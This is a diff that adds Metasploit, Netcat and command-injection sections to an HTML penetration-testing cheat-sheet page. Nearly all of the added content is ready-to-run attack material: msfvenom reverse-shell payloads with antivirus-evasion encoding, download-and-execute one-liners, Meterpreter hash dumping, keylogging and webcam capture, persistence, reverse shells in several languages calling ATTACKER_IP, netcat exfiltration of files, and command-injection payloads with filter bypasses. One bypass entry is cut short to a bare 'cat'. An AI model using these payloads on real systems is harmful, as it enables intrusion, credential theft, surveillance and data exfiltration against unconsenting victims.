@@ -758,6 +758,10 @@ sudo chown -R $USER:$USER /opt/Probable-Wordlists</pre>
                 <i class="fas fa-code nav-icon"></i>
                 <span>XSS & CSRF</span>
             </div>
+            <div class="nav-item" data-target="command-injection">
+                <i class="fas fa-terminal nav-icon"></i>
+                <span>Command Injection</span>
+            </div>
             <div class="nav-item" data-target="idor">
                 <i class="fas fa-unlock-alt nav-icon"></i>
                 <span>IDOR & LFI/RFI</span>
@@ -765,6 +769,14 @@ sudo chown -R $USER:$USER /opt/Probable-Wordlists</pre>
             <div class="nav-item" data-target="file-upload">
                 <i class="fas fa-upload nav-icon"></i>
                 <span>File Upload</span>
+            </div>
+            <div class="nav-item" data-target="metasploit">
+                <i class="fas fa-bomb nav-icon"></i>
+                <span>Metasploit Framework</span>
+            </div>
+            <div class="nav-item" data-target="netcat">
+                <i class="fas fa-network-wired nav-icon"></i>
+                <span>Netcat Master Guide</span>
             </div>
              <div class="nav-item" data-target="mssql">
                 <i class="fas fa-server nav-icon"></i>
@@ -2060,6 +2072,597 @@ john --wordlist=pass.txt HTTP-NTLMv2-*.txt</pre>
                         </div>
                     </div>
                     
+                </div>
+            </div>
+        </div>
+        
+        <!-- Metasploit & msfvenom -->
+        <div class="accordion-container" id="metasploit">
+            <div class="content-header">
+                <h1>🔥 Metasploit Framework Master Guide</h1>
+                <p>Exploitation, payload generation, and post-exploitation with Metasploit</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">MS.1</span>
+                        msfvenom - Reverse Shell Payload Generation
+                        <span class="accordion-badge">CRITICAL</span>
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Windows Reverse Shell Payloads</h3>
+                            <div class="code-block">
+                                <span class="code-label">Windows x64 Meterpreter (Staged)</span>
+                                <pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Windows x86 Meterpreter (Stageless)</span>
+                                <pre>msfvenom -p windows/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Windows CMD Shell (Non-Meterpreter)</span>
+                                <pre>msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o cmd_shell.exe</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Linux Reverse Shell Payloads</h3>
+                            <div class="code-block">
+                                <span class="code-label">Linux x64 Meterpreter</span>
+                                <pre>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Linux x86 Shell</span>
+                                <pre>msfvenom -p linux/x86/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Web Payloads (PHP, ASP, JSP)</h3>
+                            <div class="code-block">
+                                <span class="code-label">PHP Meterpreter</span>
+                                <pre>msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">ASP Meterpreter</span>
+                                <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f asp -o shell.asp</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">JSP Meterpreter</span>
+                                <pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Advanced Payload Options</h3>
+                            <div class="code-block">
+                                <span class="code-label">Encoder (Avoid AV Detection)</span>
+                                <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded_shell.exe</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Iterations (Multiple Encoding)</span>
+                                <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o multi_encoded.exe</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Custom Template (Bypass AV)</span>
+                                <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x /usr/share/windows-binaries/plink.exe -f exe -o legit_looking.exe</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Payload Delivery Methods</h3>
+                            <div class="code-block">
+                                <span class="code-label">Python HTTP Server</span>
+                                <pre>python3 -m http.server 8000</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Windows Download & Execute</span>
+                                <pre>certutil -urlcache -f http://ATTACKER_IP:8000/shell.exe shell.exe && shell.exe</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">PowerShell Download</span>
+                                <pre>powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/shell.exe', 'shell.exe'); Start-Process shell.exe"</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">MS.2</span>
+                        msfconsole - Exploitation Framework
+                        <span class="accordion-badge">ESSENTIAL</span>
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Basic msfconsole Commands</h3>
+                            <div class="code-block">
+                                <span class="code-label">Start Metasploit</span>
+                                <pre>msfconsole</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Search for Exploits</span>
+                                <pre>search type:exploit platform:windows smb
+search cve:2023
+search name:eternalblue</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Use an Exploit Module</span>
+                                <pre>use exploit/windows/smb/ms17_010_eternalblue</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Exploit Configuration</h3>
+                            <div class="code-block">
+                                <span class="code-label">Show Options</span>
+                                <pre>show options</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Set Required Parameters</span>
+                                <pre>set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set LPORT 4444</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Run Exploit</span>
+                                <pre>exploit
+run</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Meterpreter Session Management</h3>
+                            <div class="code-block">
+                                <span class="code-label">Background Session</span>
+                                <pre>background</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">List Sessions</span>
+                                <pre>sessions</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Interact with Session</span>
+                                <pre>sessions -i 1</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Upgrade Shell to Meterpreter</span>
+                                <pre>use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+run</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Post-Exploitation Commands</h3>
+                            <div class="code-block">
+                                <span class="code-label">System Information</span>
+                                <pre>sysinfo
+getuid</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">File Operations</span>
+                                <pre>pwd
+ls
+cd C:\\
+download file.txt
+upload /path/to/file.txt</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Process Migration</span>
+                                <pre>ps
+migrate PID</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Persistence</span>
+                                <pre>run persistence -X -i 30 -p 443 -r ATTACKER_IP</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Advanced Meterpreter Modules</h3>
+                            <div class="code-block">
+                                <span class="code-label">Hash Dump</span>
+                                <pre>hashdump
+run post/windows/gather/smart_hashdump</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Keylogger</span>
+                                <pre>keyscan_start
+keyscan_dump
+keyscan_stop</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Screenshot</span>
+                                <pre>screenshot</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Webcam Capture</span>
+                                <pre>webcam_snap</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Network Pivoting</h3>
+                            <div class="code-block">
+                                <span class="code-label">Add Route</span>
+                                <pre>run autoroute -s 192.168.2.0/24</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Port Forwarding</span>
+                                <pre>portfwd add -l 3389 -p 3389 -r 192.168.2.100</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">SOCKS Proxy</span>
+                                <pre>use auxiliary/server/socks_proxy
+set SRVPORT 9050
+run</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Netcat -->
+        <div class="accordion-container" id="netcat">
+            <div class="content-header">
+                <h1>🔌 Netcat Master Guide - The Swiss Army Knife</h1>
+                <p>Reverse shells, file transfers, port scanning, and network debugging</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">NC.1</span>
+                        Netcat Reverse Shells - Complete Guide
+                        <span class="accordion-badge">ESSENTIAL</span>
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Basic Reverse Shell Setup</h3>
+                            <div class="code-block">
+                                <span class="code-label">Attacker Listener (Kali)</span>
+                                <pre>nc -lvnp 4444</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Linux Target</span>
+                                <pre>nc ATTACKER_IP 4444 -e /bin/bash</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Windows Target (PowerShell)</span>
+                                <pre>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Advanced Reverse Shell Techniques</h3>
+                            <div class="code-block">
+                                <span class="code-label">Bash Reverse Shell</span>
+                                <pre>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Python Reverse Shell</span>
+                                <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">PHP Reverse Shell</span>
+                                <pre>php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Perl Reverse Shell</span>
+                                <pre>perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Netcat File Transfer</h3>
+                            <div class="code-block">
+                                <span class="code-label">Receiver (Attacker)</span>
+                                <pre>nc -lvnp 4444 > received_file</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Sender (Target)</span>
+                                <pre>nc ATTACKER_IP 4444 < file_to_send</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Directory Transfer (Tar)</span>
+                                <pre>tar -czf - directory/ | nc ATTACKER_IP 4444</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Receive Directory</span>
+                                <pre>nc -lvnp 4444 | tar -xzf -</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Port Scanning with Netcat</h3>
+                            <div class="code-block">
+                                <span class="code-label">TCP Port Scan</span>
+                                <pre>nc -zv TARGET_IP 20-100</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">UDP Port Scan</span>
+                                <pre>nc -zvu TARGET_IP 53,67,68,69,123</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Banner Grabbing</span>
+                                <pre>echo "" | nc -nv TARGET_IP 22
+nc -nv TARGET_IP 80
+HEAD / HTTP/1.0\n\n | nc TARGET_IP 80</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Netcat as Chat Server/Proxy</h3>
+                            <div class="code-block">
+                                <span class="code-label">Chat Server</span>
+                                <pre>nc -lvnp 4444</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Chat Client</span>
+                                <pre>nc ATTACKER_IP 4444</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Port Forwarding/Proxy</span>
+                                <pre>mkfifo /tmp/fifo
+nc -lvnp 4444 < /tmp/fifo | nc TARGET_IP 80 > /tmp/fifo</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Netcat for Vulnerability Testing</h3>
+                            <div class="code-block">
+                                <span class="code-label">HTTP Header Testing</span>
+                                <pre>printf "GET / HTTP/1.1\r\nHost: TARGET\r\n\r\n" | nc TARGET_IP 80</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">SMTP Testing</span>
+                                <pre>nc TARGET_IP 25
+HELO test.com
+MAIL FROM: test@test.com
+RCPT TO: admin@target.com
+DATA
+Test message
+.
+QUIT</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">FTP Banner Grab</span>
+                                <pre>nc -nv TARGET_IP 21</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Persistent Netcat Listeners</h3>
+                            <div class="code-block">
+                                <span class="code-label">Keep Alive Listener</span>
+                                <pre>while true; do nc -lvnp 4444 -e /bin/bash; done</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Background Listener</span>
+                                <pre>nc -lvnp 4444 -e /bin/bash &</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Systemd Service (Persistence)</span>
+                                <pre>echo '[Unit]\nDescription=Netcat Listener\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/nc -lvnp 4444 -e /bin/bash\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/nc.service
+systemctl enable nc.service
+systemctl start nc.service</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Command Injection -->
+        <div class="accordion-container" id="command-injection">
+            <div class="content-header">
+                <h1>💻 Command Injection - Complete Exploitation Guide</h1>
+                <p>Injecting and executing system commands through web applications</p>
+            </div>
+            
+            <div class="accordion open">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.3</span>
+                        Command Injection Detection & Basic Exploitation
+                        <span class="accordion-badge">CRITICAL</span>
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Identifying Injection Points</h3>
+                            <div class="code-block">
+                                <span class="code-label">Common Parameters</span>
+                                <pre>?cmd=ping
+?ip=127.0.0.1
+?host=localhost
+?file=test.txt
+?dir=/tmp
+?name=test
+?query=search
+?input=data
+?url=http://test.com
+?path=/etc/passwd</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Web Application Features</span>
+                                <pre>Ping utilities
+DNS lookup tools
+File upload/download
+System information displays
+Network diagnostic tools
+Email/SMS send functions</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Basic Detection Payloads</h3>
+                            <div class="code-block">
+                                <span class="code-label">Time-Based Detection</span>
+                                <pre>127.0.0.1; sleep 5
+127.0.0.1 | sleep 5
+127.0.0.1 && sleep 5
+127.0.0.1 || sleep 5
+127.0.0.1 `sleep 5`</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Blind Injection Detection</span>
+                                <pre>127.0.0.1; whoami
+127.0.0.1 | id
+127.0.0.1 && pwd
+127.0.0.1 || ls -la</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Output-Based Detection</span>
+                                <pre>127.0.0.1; cat /etc/passwd
+127.0.0.1 | head -n 5 /etc/passwd
+127.0.0.1 && uname -a</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Command Separators & Operators</h3>
+                            <div class="code-block">
+                                <span class="code-label">Unix/Linux Separators</span>
+                                <pre>;       # Sequential execution
+|       # Pipe output
+&       # Background process
+&&      # AND operator (execute if previous succeeds)
+||      # OR operator (execute if previous fails)
+`cmd`   # Command substitution
+$(cmd)  # Command substitution</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Windows Separators</span>
+                                <pre>&       # Sequential execution
+&&      # AND operator
+||      # OR operator
+|       # Pipe
+%cd%    # Environment variable</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Parameter Selection Methodology</h3>
+                            <div class="code-block">
+                                <span class="code-label">Step 1: Identify All Inputs</span>
+                                <pre>Burp Suite → Proxy → Intercept requests
+Check ALL parameters: GET, POST, Headers, Cookies
+Note parameter names and values</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Step 2: Test Each Parameter</span>
+                                <pre>For each parameter, test with basic payloads:
+param=original_value; whoami
+param=original_value | id
+param=original_value && pwd</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Step 3: Bypass Filters</span>
+                                <pre>Try URL encoding: ; → %3b, | → %7c
+Try case variation: WhOaMi
+Try double quotes: "whoami"
+Try backticks: `id`</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Step 4: Confirm Injection</span>
+                                <pre>Use time-based: sleep 5
+Use DNS/HTTP call: nslookup ATTACKER_IP
+Use file creation: touch /tmp/test</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">4.4</span>
+                        Advanced Command Injection & Reverse Shells
+                        <span class="accordion-badge">ESSENTIAL</span>
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Reverse Shell Payloads</h3>
+                            <div class="code-block">
+                                <span class="code-label">Bash Reverse Shell</span>
+                                <pre>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Netcat Traditional</span>
+                                <pre>nc -e /bin/sh ATTACKER_IP 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Python Reverse Shell</span>
+                                <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">PHP Reverse Shell</span>
+                                <pre>php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>File Upload & Execution</h3>
+                            <div class="code-block">
+                                <span class="code-label">Download and Execute</span>
+                                <pre>curl http://ATTACKER_IP/shell.sh | bash
+wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Create File with Echo</span>
+                                <pre>echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/shell.sh
+chmod +x /tmp/shell.sh
+/tmp/shell.sh</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Python HTTP Server</span>
+                                <pre>python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP/shell.exe', 'shell.exe')"</pre>
+                            </div>
+                        </div>
+                        
+                        <div class="section">
+                            <h3>Filter Bypass Techniques</h3>
+                            <div class="code-block">
+                                <span class="code-label">Character Encoding</span>
+                                <pre>whoami → w$()hoami
+cat /etc/passwd → c$@at /etc/passwd
+echo test → e\cho test</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Case Manipulation</span>
+                                <pre>WHOAMI
+WhOaMi
+whoami</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Whitespace Bypass</span>
+                                <pre>cat</pre>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
